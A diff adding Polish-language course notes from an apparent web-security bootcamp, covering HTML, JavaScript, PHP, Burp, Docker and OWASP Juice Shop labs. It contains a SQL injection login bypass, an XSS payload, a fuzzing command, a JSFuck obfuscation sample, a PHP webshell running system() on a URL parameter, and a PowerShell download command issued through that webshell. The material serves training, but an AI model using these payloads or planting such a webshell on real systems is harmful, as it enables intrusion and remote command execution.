@@ -1,0 +1,992 @@
+📅 15.01.2023 🕘 [09:00]
+
+Wykładowca: Przemysław Anioł
+@: przemyslaw.aniol@hackeru.com
+
+Global Web Fundamentals
+
+Chapter 1 Introduction to HTML & CSS Fundamentals 
+= - = - = - = - = - = - =  - = - = - = - = - = - 
+
+
+ℹ️ Przerwy:
+
+10.30-11.00
+12.30-13.00
+15.00-15.30
+
+***
+
+Ciekawe rzeczy:
+https://owasp.org/www-project-top-ten/
+https://security.snyk.io/
+Wtyczka wappalyzer
+0day.today
+https://cve.mitre.org/cve/
+https://web.archive.org
+https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/
+
+Do dodatkowej nauki:
+https://www.w3schools.com/
+
+---------------
+
+
+Obsługa Apache:
+
+    start:
+
+    sudo service apache2 start
+
+    sudo systemctl start apache2
+
+    restart:
+
+    sudo service apache2 restart
+
+    sudo systemctl restart apache2
+
+    sprawdzenie statusu
+
+    sudo service apache2 status
+
+    sudo systemctl status apache2
+
+
+Pobieranie Visual Studio na Kalim:
+1. https://code.visualstudio.com/download
+2. .deb pod Tuxem 🐧 (Pobiera się pakiet .deb do ~/Downloads)
+3. sudo chmod +x code_1.74.3-1673284829_amd64.deb
+4. sudo dpkg -i code_1.74.3-1673284829_amd64.deb
+5. Otworzyć za pomocą code albo wyszukując w apkach
+
+Współpraca z apache:
+1. cd /var/www
+2. chmod 777 html (aby mieć pewność że działa)
+3. code . (code /var/www)
+
+---------------
+📄 pierwsza_stronka.html
+
+<!DOCTYPE html>
+<html>
+    <head>
+      <meta charset="utf-8">
+      <title>Strona webowa jestem</title>
+    </head>
+
+    <body>
+      <h1>Naglowek</h1>
+      <p>tekst</p>
+    </body>
+</html>
+
+-------------
+
+Jeśli są problemy przy zapisywaniu to należy kliknąć "Retry as sudo"
+
+-------------
+
+Ustawienie Burpa pod dodatkową analizę.
+Burp -> Proxy -> Intercpet na off
+Następnie w options zweryfikować ustawiony adres IP i port
+
+🦊 Instalacja Foxy Proxy:
+
+    Firefox
+
+    https://addons.mozilla.org/pl/firefox/addon/foxyproxy-standard/
+
+    Instalacja poprzez Add to firefox
+
+    Kliknąc w nowo pojawione logo foxy proxy i Options
+
+    Kliknąć Add
+
+    Dać tytuł (np. burp 8080), adres Proxy IP (127.0.0.1) i port (8080)
+
+    save
+
+    Teraz na liście widocznej po kliknięciu loga wybrać nasze proxy
+
+
+-------------
+
+Obsługa Burp:
+Przesłanie do Repeater:
+
+    Kliknąc prawym i "send to the repeater"
+
+Zobaczenie jak to wygląda w przeglądarce:
+
+    1. Prawym na odpowiedź (zapytanie) i show response in browser (request in browser > jedna z opcji),
+
+    2. Wkleić podany adres do przeglądarki
+
+
+-------------
+
+[Introduction to HTML]
+
+### 📋 – Lab01 Basic Page
+
+📄 naglowki.html
+
+<!DOCTYPE.html>
+<HTML>
+    <head>
+       <meta charset="UTF-8">
+       <title>maciej</title>
+    </head>
+    <body>
+        <h1>przemek</h1>
+        <h2>marlena</h2>
+        <h3>przemek</h3>
+        <h4>marlena</h4>
+        <h5>przemek</h5>
+    </body>    
+</HTML>  
+
+-------------
+
+📄 tagi.html
+
+<!DOCTYPE.html>
+<HTML>
+    <head>
+       <meta charset="UTF-8">
+       <title>Tagi</title>
+    </head>
+    <body>
+        <h1>przemek</h1>
+        <h2>marlena</h2>
+        <h3>przemek</h3>
+        <h4>marlena</h4>
+        <p>
+            <b>pogrubiona</b>
+            <br>
+            <mark>zaznaczony</mark>
+            <br>
+            <i>italic kursywa</i>
+            <br>
+            <del>przekreslony</del>
+            <br>
+            <fieldset>tekst w ramce</fieldset>
+
+    <br>
+
+    <u>tag podkreslenia</u>
+
+        </p>
+   
+   ***
+   
+### 📋 – Lab02 Lists
+    
+    <h1>LISTA MIAST</h1>
+    <ul>    
+        <li>Wroclaw</li>
+        <li>Amsterdam</li>
+        <li>Warszawa</li>
+    </ul>
+    <h1>Lista narzedzi</h1>
+    <ol>
+        <li>kombinerki</li>
+        <li>mlotek</li>
+        <li>taczka</li>
+    </ol>    
+    </body>    
+</HTML>
+
+***
+
+### 📋 – Lab03 Graphical Content
+
+📄 obrazek.html
+
+# z zewnętrznego źródła
+<img src="https://upload.wikimedia.org/wikipedia/commons/b/b4/JPEG_example_JPG_RIP_100.jpg">
+
+# z dysku lokalnego (po uprzednim zapisie w lokalizacji /var/www/html)
+<img src="./JPEG_example_JPG_RIP_100.jpg">
+
+***
+
+📄 link.html
+
+<a href="./costam/dwa.html"></a>
+    <br>
+    <h2>Stronka Druga</h2>
+
+***
+
+📄 skalowanie.html
+
+<img src="./JPEG_example_JPG_RIP_100.jpg">
+<br>
+#wysokość
+<img src="./JPEG_example_JPG_RIP_100.jpg" height="40px">
+<br>
+#szerokość
+<img src="./JPEG_example_JPG_RIP_100.jpg" width="1920px">
+
+***
+
+📄 tabele.html
+
+<!DOCTYPE.html>
+<HTML>
+    <head>
+       <meta charset="UTF-8">
+       <title>Tabele</title>
+    </head>
+    <body>
+
+<table border="2px">
+    <tr>
+        <th>Naglowek 1</th>
+        <th>Naglowek 2</th>
+        <th>Naglowek 3</th>
+    </tr>
+    <tr>
+        <td>rzecz1</td>
+        <td>rzecz2</td>
+        <td>rzecz3</td>
+    </tr>
+    <tr>
+        <td>rzecz1numer2</td>
+        <td>rzecz2numer2</td>
+        <td>rzecz3numer2</td>
+    </tr>
+</table>
+
+    </body>
+</HTML>
+
+***
+
+### 📋 – Lab04 iFrame
+
+📄 iframe.html
+
+<!DOCTYPE.html>
+<HTML>
+    <head>
+       <meta charset="UTF-8">
+       <title>Site is clickjacked!</title>
+    </head>
+    <body>
+        <h1>iframe</h1>
+        <iframe src="https://auschwitz.org" width="500px" height="500px">
+        <iframe>
+   </body>
+</HTML>
+
+🔗 -- Przeciwdziałanie X-Frame-Options
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+
+***
+
+[CSS Fundamentals]
+
+Klonowanie strony httrack
+
+    sudo apt update
+
+    sudo apt install httrack
+
+    Project name: hy
+
+    Base path: /home/kali/websites/
+
+    Enter URL: https://hack-yourself-first.com/
+
+    1 - Mirror Web Site
+
+    Proxy: none
+
+    Wildcards: none
+
+    Recurse level: none
+
+    Ready to launch: Y
+
+
+Po skopiowaniu strony:
+
+    cd /home/kali/websites/hy
+
+    firefox index.html
+
+
+Zmiany w pliku index.html
+<title>Przemek</title>
+
+🔗 -- W3 Schools HTML + CSS
+https://www.w3schools.com/html/default.asp
+https://www.w3schools.com/css/default.asp
+
+***
+
+📅 21.01.2023 🕘 [09:00]
+
+Global Web Fundamentals
+
+Chapter 2 JavaScript Fundamentals & Building Web Pages 
+= - = - = - = - = - = - =  - = - = - = - = - = - = - =
+
+[JavaScript Fundamentals]
+
+🔗 -- Kompilator on-line
+https://playcode.io/javascript
+
+🔗 -- Open Source Vulnerability Database
+https://security.snyk.io/
+
+***
+
+### 📋 – Lab01 Introduction to JavaScript
+
+PlayCode - console
+
+var myString = "czysty <> tekst";
+console.log(myString);
+console.log(typeof myString);
+
+var numer = 35;
+console.log(numer);
+console.log(typeof numer);
+
+var bool = true;
+console.log(bool);
+console.log(typeof bool);
+
+var niezdefiniowana;
+console.log(niezdefiniowana);
+console.log(typeof niezdefiniowana);
+
+Zrzutowanie zmiennych:
+
+var numer = 35;
+console.log(numer);
+console.log(typeof numer);
+console.log(String(numer));
+
+***
+
+### 📋 – Lab02 Arithmetical Operations
+
+var a = 10;
+var b = 5;
+var c = 3;
+
+var addition = a + b;
+console.log(addition);
+var substraction = a -b;
+console.log(substraction);
+var multiplication = a * b;
+console.log(multiplication);
+var division = a / b;
+console.log(division);
+var modulo = a % c;
+console.log(modulo);
+
+***
+
+Długość ciągu i wyświetlenie znaku ze stringa
+
+var helo = "Hello";
+console.log(helo.length);
+console.log(helo[1]);
+
+***
+
+if - else
+
+var a = 10;
+var slowo = "hackeru";
+
+if (a > 9) {
+   console.log("a jest wieksze od 9");
+} else if (slowo == "hackeru") {
+   console.log("slowo to hackeru");
+} else {
+   console.log("nic sie nie zgadza")
+}
+
+***
+
+Dodatki do przeglądarek
+
+🔗 -- uBlock Origin
+https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=pl
+
+🔗 -- Decentraleyes
+https://chrome.google.com/webstore/detail/decentraleyes/ldpochfccmkkmhdbclfhpagapcfdljkj?hl=pl
+
+***
+
+[Building Web Pages]
+
+### 📋 – Lab04 Web Application Structure
+
+📄 login.html
+
+<!DOCTYPE html>
+<html>
+    <head>
+      <meta charset="utf-8">
+      <title>Strona webowa jestem</title>
+    </head>
+
+    <body>
+<form action="target.html" method="post"></form>
+  username:
+  <input type="text">
+  <br>
+  password:
+  <input type="password">
+  <br>
+  <input type="submit">
+</form>
+    </body>
+</html>
+
+---------------------------------------------------------------------------------------
+
+🔗 -- Raport z pentestów od Sekuraka:
+https://sekurak.pl/zobacz-pelen-nieocenzurowany-raport-z-testow-penetracyjnych-canal/
+https://sekurak.pl/wp-content/uploads/2020/06/Livecall_web_20200306_public.pdf
+
+Słowniki:
+* https://wordlists-cdn.assetnote.io/data
+* sudo apt install seclists
+
+🐳 Docker
+✅ Instalacja:
+1. sudo apt update
+2. sudo apt install docker.io
+
+✅ Sprawdzenie wersji (czy poprawnie działa?):
+
+    docker --version
+
+
+✅ Podstawowe komendy
+
+    docker images - Pozwala podejrzeć jakie kontenery mamy
+
+    docker ps -a - Procesy wystartowanie w ramach dockera
+
+    docker rm <ID konteneru> - Ubija kontener określonego procesu
+
+
+✅ https://hub.docker.com
+
+    Baza kontenerów do dockera.
+
+
+✅ 🧃 https://hub.docker.com/r/bkimminich/juice-shop
+
+    Kontener z sklepem z sokami.
+
+
+✅ Wrzucanie obrazu juice shop
+
+    1. docker pull bkimminich/juice-shop
+
+    2. docker images 
+
+    a. Sprawdzamy czy jest tam nasz sklep z sokiem.
+
+    3. docker run --rm -p 3000:3000 bkimminich/juice-shop &
+
+    a. Uruchamia na porcie 3000.
+
+    4.docker ps -a 
+
+    a. Sprawdzamy czy proces się uruchomił. Ten co nas interesuje powinien mieć status up.
+
+    5. Brawo Postawiłeś właśnie swój kontenerek :D
+
+
+---------------------------------------------------------------------------------------
+🧃 Juice Shop
+### 📋 – Task01 Sensitive data
+Jeśli w username wpiszemy ciapka ' to otrzymamy przy przechwyceniu burpem informacje o mysql
+
+### 📋 – Task02 Admin log in
+W login wpisać `
+W burpie widać jakiego hasła użyć.
+Następnie w panelu logowania wpisać:
+login: `OR 1=1 --
+Hasło: to co wyszło w burpie
+
+### 📋 – Task03 Fuzzing
+ffuf -u http://127.0.0.1:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -fs 1987 > ffuf_root.log
+Jednym z ciekawszych wyników jest /ftp
+http://127.0.0.1:3000/metrics zawiera również ciekawe informacje
+
+### 📋 – Task04 DOM based XSS
+W search wpisać:
+<iframe src="javascript:alert(1)">
+
+***
+
+📅 22.01.2023 🕘 [09:00]
+
+Global Web Fundamentals
+
+Chapter 3 Advanced JavaScript & Introduction to Server-Side 
+= - = - = - = - = - = - =  - = - = - = - = - = - = - =- = -
+
+[Advanced JavaScript]
+
+🔗 -- JS online
+https://codepen.io/pen/?editors=1111
+
+### Przykładowe funkcje:
+
+function mojafunkcja (){
+        var z1 = "Funkcja"
+        var z2 = "Dziala"
+        console.log(z1 +z2)
+}
+mojafunkcja()
+
+***
+
+function mojafunkcja (z1, z2){
+        console.log(z1 + z2)
+}
+mojafunkcja("Funkcja ", 25)
+
+***
+
+function mojafunkcja (z1, z2){
+        console.log(z1 + z2)
+}
+mojafunkcja(2, 2)
+
+***
+
+function dodawanie (z1, z2){
+        console.log(z1 + z2)
+}
+
+function odejmowanie (z1, z2){
+        console.log(z1 - z2)
+}
+
+dodawanie(2, 2)
+odejmowanie(2,2)
+
+***
+
+function dodawanie (z1, z2){
+        return z1 + z2
+}
+
+var result = dodawanie(2, 2){
+        console.log(result)
+
+***
+
+### 📋 – Lab01 Functions
+
+function main() {
+
+var price = 0;
+var age = prompt("Podaj wiek");
+var model = prompt("Podaj model:\n Ford/Volkswagen/Ford");
+}
+console.log(main())
+console.log(return(age))
+console.log(return(model))
+
+***
+
+function main(age, model) {
+    var age = prompt("Podaj wiek");
+    var model = prompt("Podaj model:\n Ford/Volkswagen/Ford");
+    return age +" "+ model
+}
+var rezultat = main()
+console.log(rezultat);
+
+***
+### Przykładowe tablice:
+
+var arr = [1,2,3]
+arr[3] = 4
+console.log(arr)
+arr.push("wartosc")
+console.log(arr)
+arr.unshift(0)
+console.log(arr)
+arr.pop()
+console.log(arr)
+arr.shift()
+console.log(arr)
+
+***
+### Przykładowe pętle:
+
+for (i = 1; i < 10; i++){
+  console.log(i)
+}
+
+***
+
+for (i = 10; i >= 0; i--){
+  console.log(i)
+}
+
+***
+
+for (i = 0; i < 10; i++){
+  console.log(i)
+  if (i == 5){
+      console.log("to już jest 5 więc już więcej nie będę zwiększać i zamykam tą pętle")
+      break
+  }
+}
+
+***
+
+var arr = [1,2,3,"wartosc"]
+for (var item in arr){
+  console.log(arr[item])
+}
+
+***
+
+while (1 == 1 ){
+  console.log(2)
+}
+
+***
+
+var numer = 0;
+while (1 == 1){
+  if (numer == 3){
+     console.log("zatrzymaj pętelke")
+     break
+  }
+  console.log("petelka " + numer)
+  numer +=1
+}
+
+***
+
+### 📋 – Lab04 Obfuscation
+
+JSFUCK PRZYKŁAD:
+    
+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[
+!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()(([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[+[]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]
++[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])
+
+***
+
+function poweredArr(arr, func){
+  var result = ""
+  for (number of arr){
+    result += func(number) + " "
+  }
+  console.log(result)
+
+}
+var arr = [1,2,3,4,5]
+poweredArr(arr,(number) => Math.pow(number,3))
+
+***
+
+localStorage.setItem("wiek", "29")
+localStorage.getItem("wiek")
+localStorage.removeItem("wiek")
+console.log(localStorage.getItem("wiek"))
+console.log(sessionStorage.getItem("wiek"))
+
+***
+🔗 -- polecana książka: Gynvael Coldwind - Zrozumieć programowanie 
+https://lubimyczytac.pl/ksiazka/270801/zrozumiec-programowanie
+
+***
+
+setTimeout(function(){
+        console.log("2 sekundy pozniej")
+},2000)
+
+setInterval(function(){
+  console.log("3 sekundy pozniej")
+},3000)
+
+***
+
+[Introduction to Server-Side]
+
+Windows 10 > Adapter 1: NAT
+
+user: jessicar
+
+Zmiana ustawień sieciowych
+ncpa.cpl
+
+ipconfig /release
+ipconfig /renew
+
+🔗 -- Download XAMPP dla Windows
+https://www.apachefriends.org/pl/download.html
+
+xampp-windows-x64-8.2.0-0-VS16-installer.exe
+
+Win+R > UAC
+Poziom: Never notify
+
+Instalacja bez Mercury Mail
+
+Start: C:\xampp\xampp-control.exe
+
+Sprawdzenie uruchomionych usług:
+    netstat -ano  | findstr LISTENING
+
+lub przycisk `Netstat`
+
+🔗 -- Download Java
+https://javadl.oracle.com/webapps/download/AutoDL?BundleId=247947_0ae14417abb444ebb02b9815e2103550
+
+
+Dostęp dp strony www XAMPP
+http://localhost/dashboard
+
+
+Katalog z zawartością strony:
+C:\xampp\htdocs
+
+Nowy projekt strony
+C:\xampp\htdocs\projekt\index.php
+
+<?php
+
+    echo "Witaj"
+
+?>
+
+Formularz logowania:
+http://localhost/projekt/index.php
+
+📄 index.php
+
+<!DOCTYPE.html>
+<HTML>
+    <head>
+       <meta charset="UTF-8">
+       <title>Projekt Grupowy</title>
+    </head>
+<body>
+
+<form action="welcome.php" method="post">
+Name : <input type="text" name="name"><br>
+E-mail: <input type="text" name="email"><br>
+<input type="submit">
+</form>
+
+</body>
+</HTML>
+
+
+📄 welcome.php
+
+<?php echo "Witaj na stronie" ?>
+
+***
+
+Operacje arytmetyczne
+
+📄 index.php
+
+<?php
+  $add = 1 + 1 ;
+  $sub = 2 - 1 ;
+  $mul = 3 * 3 ;
+  $div = 4 / 2 ;
+  $modulo = 10 % 3 ;
+  $exp =  3 ** 2 ;
+  
+  echo "$add <br>";
+  echo "$sub <br>";
+  echo "$mul <br>";
+  echo "$div <br>";
+  echo "$modulo <br>";
+  echo "$exp <br>";
+?>
+
+***
+
+Operatory porównawcze
+
+<?php
+  $equal = 5 == "5" ; //true
+  $identical = 5 === "5" ; //false
+  $not_equal = 5 != 3 ; //true
+  $not_identical = 5 !== "5" ; //true
+  $greater = 5 > 3 ; //true
+  $great_eq = 5 >= 3; //true
+  $lesser =  3 < 2 ; //false
+  $less_eq = 5 <= 5 ; //true
+  
+  echo "$equal <br>";
+  echo "$identical <br>";
+  echo "$not_equal <br>";
+  echo "$not_identical <br>";
+  echo "$greater <br>";
+  echo "$great_eq <br>";
+  echo "$lesser <br>";
+  echo "$less_eq <br>";
+  ?>
+  
+  ***
+  
+  Instrukcje warunkowe
+    
+<?php
+  if (5 > 2){
+    echo("5 jest wieksze od 2.");
+    } elseif (5 === 9){
+      echo("5 jest identyczne z 9.");
+    } else {
+      echo("Wszystko to nie jest prawda.");
+    }
+  ?>
+  
+  ***
+  
+  Operatory logiczne
+    
+<?php
+  if (5 > 2 and 6 > 3){
+    echo("5 jest wieksze od 2 i 6 jest wieksze od 3.");
+    } elseif (5 === 3 or 1 > 2){
+      echo("5 jest identyczne z 9 albo 1 jest wieksze od 2.");
+    }elseif (3 > 2 xor 2 < 1){
+      echo("Jedno jest poprawne, ale drugie nie.");
+    } else {
+      echo("Wszystko to nie jest prawda.");
+    }
+  ?>
+  
+  
+  ***
+  
+  Funkcje
+  
+  
+<?php
+  $val1 = 1;
+  $val2 = 2;
+  
+  function mYFunc(){
+    echo "cos";
+  }
+
+  function mYFunc2($val1, $val2){
+    echo $val1, $val2;
+  }
+  function mYFunc3(){
+    return "value";
+  }
+  mYFunc();
+  mYFunc2($val1, $val2);
+  mYFunc3();
+  ?>
+  
+  ***
+  
+  Pętla for
+    
+<?php
+    for ($i=0; $i < 10; $i++){
+      echo "$i <br>";
+    }
+  ?>
+
+***
+
+Pętla while
+
+<?php
+    $a = 1;
+    while ($a < 100){
+      echo("$a <br>");
+      $a++;
+    }
+  ?>
+  
+***
+
+Request's methods
+
+<!DOCTYPE html>
+<html>
+<body>
+
+<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
+  Name: <input type="text" name="fname">
+  <input type="submit">
+</form>
+
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // collect value of input field
+    $name = $_POST['fname'];
+    if (empty($name)) {
+        echo "Name is empty";
+    } else {
+        echo $name;
+    }
+}
+?>
+
+</body>
+</html>
+
+***
+
+Wyświetlenie zawartości zmiennej $_SERVER
+
+<?php
+  foreach ($_SERVER as $wartosc){
+    print_r($wartosc."<br>");
+  }
+?>
+
+***
+
+Webshell
+
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+</html>
+
+***
+
+Pobranie pliku ze strony.
+Payload do wpisania w Webshell.
+
+powershell -c "wget https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/Sunflower_from_Silesia2.jpg/800px-Sunflower_from_Silesia2.jpg -O C:\Users\jessicar\Desktop\cos.jpg"
+
+***
